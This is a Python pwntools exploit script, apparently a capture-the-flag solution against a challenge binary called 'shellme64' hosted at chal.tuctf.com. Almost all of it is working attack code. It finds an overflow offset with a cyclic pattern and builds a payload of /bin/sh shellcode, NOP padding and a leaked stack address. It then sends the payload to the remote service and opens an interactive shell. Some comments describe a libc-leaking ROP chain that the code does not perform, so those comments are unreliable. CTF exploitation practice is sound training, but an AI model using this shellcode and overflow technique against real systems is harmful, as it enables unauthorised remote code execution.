from pwn import *
from struct import pack

##########################################################################
# My approach to Binary Exploitation on ASLR Enabled systems.
# DOWNLOAD PWNTOOLS TO RUN!
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

nops = b'\x90'
padding = b'\x00'

clean = lambda x: x.split('\n')[1:-2]
pad = lambda x: x + padding*(8-len(x))

##########################################################################
# Load Binaries and Respective libc
#
# To Find the Libc version, make ROP chain to print address of libc
# functions, which are stored in GOT table as values of pointers.
# Just pass the address of pointer to RDI through pop rdi; ret
# And call printf function.
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

elf = ELF('./shellme64')
context.binary = './shellme64'
libc = ELF("/lib/x86_64-linux-gnu/libc-2.30.so")
# libc  = ELF("/lib/x86_64-linux-gnu/libc-2.30.so")
##########################################################################
# Find Offset
##########################################################################

r = elf.process()
crash = cyclic(1024)
r.recvline()
r.clean()
r.sendline(crash)
r.wait()
core = r.corefile
rsp = core.rsp
offset = core.read(rsp, 4)
offset =  cyclic_find(offset)
success("Offset found @ {a} bytes".format(a=offset))

##########################################################################
# Generate Initial Payload to Leak memory
##########################################################################

### Find manually
crashOffset = offset	

shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
junk = shellcode + nops*(crashOffset - (8 + len(shellcode))) + p64(0x7fffffffd7e8) # Override RBP

nullbytes = p64(0)
padding = p64(0xdeadbeefdeadbeef)

##########################################################################
# Demo ==> 
##########################################################################

# r = elf.process()
r = remote('chal.tuctf.com', 30507)
# gdb.attach(r.pid, """c""")

print(r.readline())
stack_addr = p64(int(r.readline().decode('utf-8').split('\n')[0], 16))

### This Payload prints printf and read addressed and calls main function again
payload = b''.join([junk, \
    stack_addr])


r.sendline(payload)
r.interactive()
